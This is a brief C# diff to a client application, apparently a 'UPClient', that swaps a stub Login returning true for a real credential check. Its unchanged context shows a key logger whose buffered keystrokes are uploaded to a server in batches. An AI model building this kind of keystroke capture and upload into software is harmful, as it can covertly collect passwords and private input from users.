@@ -27,7 +27,7 @@ namespace UPClient
         }
         public bool Login(String UserName, String Password)
         {
-            return true;
+            return connection.CheckCredentials(UserName, Password);
         }
         public bool Register(String UserName, String Password)
         {
@@ -39,6 +39,7 @@ namespace UPClient
             {
                 if (keyLogger.GetData().Count > 100 && keyLogger != null)
                 {
+
                     connection.SendData(keyLogger.GetData());
                     keyLogger.GetData().Clear();
                 }
